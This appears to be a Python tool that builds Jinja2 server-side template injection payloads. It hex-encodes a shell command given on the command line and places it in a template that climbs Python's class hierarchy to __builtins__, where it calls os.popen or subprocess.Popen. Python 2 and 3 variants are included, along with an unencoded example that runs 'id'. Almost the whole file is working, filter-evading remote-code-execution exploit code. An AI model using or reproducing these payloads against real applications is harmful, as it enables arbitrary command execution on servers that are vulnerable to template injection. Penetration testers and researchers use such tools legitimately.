import sys

# ref https://www.onsecurity.io/blog/server-side-template-injection-with-jinja2/

def str_to_hex(s, x=False):
    if x and s.strip() != '':
        return '\\x' + '\\x'.join([hex(ord(c))[2:] for c in s])
    else:
        return ''.join([hex(ord(c))[2:] for c in s])


command = sys.argv[1]

template_type = 'py3'

'''
{% for x in ().__class__.__base__.__subclasses__() %}
    {% if "warning" in x.__name__ %}
        {{x()._module.__builtins__['__import__']('os').popen("id").read()}}
    {%endif%}
{%endfor%}
'''

if template_type ==  'py2':
    # Python 2
    template = r"""
    {% for a in []["5F5F636C6173735F5F"["\x64\x65\x63\x6F\x64\x65"]("\x68\x65\x78")]["5F5F626173655F5F"["\x64\x65\x63\x6F\x64\x65"]("\x68\x65\x78")]["5F5F737562636C61737365735F5F"["\x64\x65\x63\x6F\x64\x65"]("\x68\x65\x78")]() %}
        {% if "7761726E696E67"["\x64\x65\x63\x6F\x64\x65"]("\x68\x65\x78") in a["5F5F6E616D655F5F"["\x64\x65\x63\x6F\x64\x65"]("\x68\x65\x78")] %}
            {{a()["5F6D6F64756C65"["\x64\x65\x63\x6F\x64\x65"]("\x68\x65\x78")]["5F5F6275696C74696E735F5F"["\x64\x65\x63\x6F\x64\x65"]("\x68\x65\x78")]["5F5F696D706F72745F5F"["\x64\x65\x63\x6F\x64\x65"]("\x68\x65\x78")]("73756270726f63657373"["\x64\x65\x63\x6f\x64\x65"]("\x68\x65\x78"))["506f70656e"["\x64\x65\x63\x6f\x64\x65"]("\x68\x65\x78")](PAYLOAD, shell=True)}}
        {%endif%}
    {%endfor%}
    """
    decode_hex = '["\\x64\\x65\\x63\\x6f\\x64\\x65"]("\\x68\\x65\\x78")'
    command = '("%s"%s)' % (str_to_hex(command), decode_hex)
else:
    # Python 2 or 3
    template = r"""
    {% for x in ()|attr('\x5f\x5f\x63\x6c\x61\x73\x73\x5f\x5f')|attr('\x5f\x5f\x62\x61\x73\x65\x5f\x5f')|attr('\x5f\x5f\x73\x75\x62\x63\x6c\x61\x73\x73\x65\x73\x5f\x5f')() %}
    {% if "\x77\x61\x72\x6e\x69\x6e\x67" in x['\x5f\x5f\x6e\x61\x6d\x65\x5f\x5f'] %}
        {{x()['\x5f\x6d\x6f\x64\x75\x6c\x65']['\x5f\x5f\x62\x75\x69\x6c\x74\x69\x6e\x73\x5f\x5f']['\x5f\x5f\x69\x6d\x70\x6f\x72\x74\x5f\x5f']('\x6f\x73')['\x70\x6f\x70\x65\x6e']("PAYLOAD")['\x72\x65\x61\x64']()}}
    {%endif%}
{%endfor%}
    """
    command = str_to_hex(command, x=True)



# command = f'("{str_to_hex(instr)}"{decode_hex})'

result = template.replace('PAYLOAD', command)
print(result)
